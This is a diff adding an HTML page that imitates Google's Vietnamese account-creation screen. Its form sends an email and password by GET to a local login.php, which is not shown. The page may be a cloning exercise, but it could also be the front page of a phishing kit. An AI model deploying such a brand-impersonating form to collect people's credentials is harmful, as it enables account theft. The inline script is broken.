@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tạo tài khoản Google</title>
+    <link rel="stylesheet" href="./css/style-ifame.css">
+</head>
+<body>
+    <table id="top">
+        <tr>
+            <td id="form">
+                <form action="login.php" method="GET">
+                    <fieldset style="border: 1px none;">
+                        <legend id="legend"><span class="legend-blue">G</span><span class="legend-red">o</span><span class="legend-yellow">o</span><span class="legend-blue">g</span><span class="legend-green">l</span><span class="legend-red">e</span></legend>
+                        <h3>Tạo Tài khoản Google</h3>
+                        <p>Tiếp tục với Gmail</p>
+                        <fieldset class="fiel-none">
+                            <legend class="legend-none" >Họ</legend>
+                            <input type="text" class="input-inline" placeholder="Họ" onclick="onInput()">
+                        </fieldset>
+                        <fieldset class="fiel-none">
+                            <legend class="legend-none">Tên</legend>
+                            <input type="text" class="input-inline" placeholder="Tên" onclick="onInput()">
+                        </fieldset>
+                        <fieldset class="fiel-none ">
+                            <legend class="legend-none">Tên người dùng</legend>
+                            <button id="fix-inline"><input type="text" name="email" id="email" placeholder="Tên người dùng" onclick="onInput()"><span>@gmail.com</span></button>
+                        </fieldset>
+                        <p>Bạn có thể sử dụng chữ cái, số và dấu chấm</p>
+                        <fieldset class="fiel-none">
+                            <legend class="legend-none">Mật khẩu</legend>
+                            <input type="password" class="input-inline"  name="password" id="password" placeholder="Mật khẩu" onclick="onInput()">
+                        </fieldset>
+                        <fieldset class="fiel-none">
+                            <legend class="legend-none">Mật khẩu</legend>
+                            <input type="password" class="input-inline" name="repass" id="repass" placeholder="Xác nhận" onclick="onInput()">
+                        </fieldset>
+                        <p>Sử dụng 8 ký tự trở lên và kết hợp chữ cái, số và biểu tượng</p>
+                        <button>Đăng nhập</button>
+                        <button>Tiếp theo</button>
+                    </fieldset>
+                </form>
+            </td>
+            <td>
+                <img src="./img/account.jpg" alt="Account">
+                <p>Một tài khoản. Hoạt động trên mọi sản phẩm và dịch vụ của Google.</p>
+            </td>
+        </tr>
+    </table>
+    <table id="footer">
+        <tr>
+            <td>
+                <select placeholder="Tiếng Việt" id="bottom-left">
+                    <option value="AF">Afrikaans</option>
+                    <option value="SQ">Albanian</option>
+                    <option value="AR">Arabic</option>
+                    <option value="HY">Armenian</option>
+                    <option value="EU">Basque</option>
+                    <option value="BN">Bengali</option>
+                    <option value="BG">Bulgarian</option>
+                    <option value="CA">Catalan</option>
+                    <option value="KM">Cambodian</option>
+                    <option value="ZH">Chinese (Mandarin)</option>
+                    <option value="HR">Croatian</option>
+                    <option value="CS">Czech</option>
+                    <option value="DA">Danish</option>
+                    <option value="NL">Dutch</option>
+                    <option value="EN">English</option>
+                    <option value="ET">Estonian</option>
+                    <option value="FJ">Fiji</option>
+                    <option value="FI">Finnish</option>
+                    <option value="FR">French</option>
+                    <option value="KA">Georgian</option>
+                    <option value="DE">German</option>
+                    <option value="EL">Greek</option>
+                    <option value="GU">Gujarati</option>
+                    <option value="HE">Hebrew</option>
+                    <option value="HI">Hindi</option>
+                    <option value="HU">Hungarian</option>
+                    <option value="IS">Icelandic</option>
+                    <option value="ID">Indonesian</option>
+                    <option value="GA">Irish</option>
+                    <option value="IT">Italian</option>
+                    <option value="JA">Japanese</option>
+                    <option value="JW">Javanese</option>
+                    <option value="KO">Korean</option>
+                    <option value="LA">Latin</option>
+                    <option value="LV">Latvian</option>
+                    <option value="LT">Lithuanian</option>
+                    <option value="MK">Macedonian</option>
+                    <option value="MS">Malay</option>
+                    <option value="ML">Malayalam</option>
+                    <option value="MT">Maltese</option>
+                    <option value="MI">Maori</option>
+                    <option value="MR">Marathi</option>
+                    <option value="MN">Mongolian</option>
+                    <option value="NE">Nepali</option>
+                    <option value="NO">Norwegian</option>
+                    <option value="FA">Persian</option>
+                    <option value="PL">Polish</option>
+                    <option value="PT">Portuguese</option>
+                    <option value="PA">Punjabi</option>
+                    <option value="QU">Quechua</option>
+                    <option value="RO">Romanian</option>
+                    <option value="RU">Russian</option>
+                    <option value="SM">Samoan</option>
+                    <option value="SR">Serbian</option>
+                    <option value="SK">Slovak</option>
+                    <option value="SL">Slovenian</option>
+                    <option value="ES">Spanish</option>
+                    <option value="SW">Swahili</option>
+                    <option value="SV">Swedish </option>
+                    <option value="TA">Tamil</option>
+                    <option value="TT">Tatar</option>
+                    <option value="TE">Telugu</option>
+                    <option value="TH">Thai</option>
+                    <option value="BO">Tibetan</option>
+                    <option value="TO">Tonga</option>
+                    <option value="TR">Turkish</option>
+                    <option value="UK">Ukrainian</option>
+                    <option value="UR">Urdu</option>
+                    <option value="UZ">Uzbek</option>
+                    <option value="VI">Tiếng Việt</option>
+                    <option value="CY">Welsh</option>
+                    <option value="XH">Xhosa</option>
+                  </select>
+            </td>
+            <td id="bottom-right">
+                <ul>
+                    <li><a href="#">Trợ giúp</a></li>
+                    <li><a href="#">Bảo mật</a></li>
+                    <li><a href="#">Điều khoản</a></li>
+                </ul>
+            </td>
+        </tr>
+    </table>
+    <script>
+        function onInput(){
+            event.preventDefault();
+            var fsnone=document.getElementsByClassName('fiel-none')
+            var lgnone=document.getElementsByClassName('legend-none')
+            fsnone.style.border= "1px solid blue";
+            lgnone.style.display= "block";
+        }
+    </script>
+</body>
+</html>
